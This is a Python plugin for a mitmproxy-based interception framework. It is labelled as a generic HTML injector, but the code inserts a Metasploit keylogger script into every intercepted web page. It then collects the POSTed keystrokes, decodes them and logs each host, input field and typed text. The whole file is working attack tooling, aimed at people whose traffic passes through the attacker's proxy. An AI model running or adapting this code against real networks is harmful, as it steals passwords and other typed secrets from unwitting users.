from os import path
from bs4 import BeautifulSoup
from mitmproxy.models import decoded
from plugins.plugin import PluginTemplate

class html_inject(PluginTemplate):
    name    = 'html_inject'
    version = '1.0'
    desc    = ' inject arbitrary HTML code into a vulnerable web page.'
    def __init__(self):
        self.filehtml   = './core/scripts/msfkeylogger.js'
        self.isfilePath  = False
        if path.isfile(self.filehtml):
            self.isfilePath = True
            self.content = open(self.filehtml,'r').read()
    def request(self, flow):
        if flow.request.method == 'POST' and ('keylog' in flow.request.path):

            raw_keys = flow.request.content.split("&&")[0]
            input_field = flow.request.content.split("&&")[1]

            keys = raw_keys.split(",")
            if keys:
                del keys[0]; del(keys[len(keys)-1])

                nice = ''
                for n in keys:
                    if n == '9':
                        nice += "<TAB>"
                    elif n == '8':
                        nice = nice[:-1]
                    elif n == '13':
                        nice = ''
                    else:
                        try:
                            nice += n.decode('hex')
                        except:
                            self.log.info("["+self.name+"] Error decoding char: {}".format(n))

                self.log.info("["+self.name+"] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))

    def response(self,flow):
        with decoded(flow.response):
            flow.response.content = flow.response.content.replace("</body>", "<script>" + self.content + "</script></body>")
            self.log.info('[{}] *********** keylogger injected *****************'.format(self.name))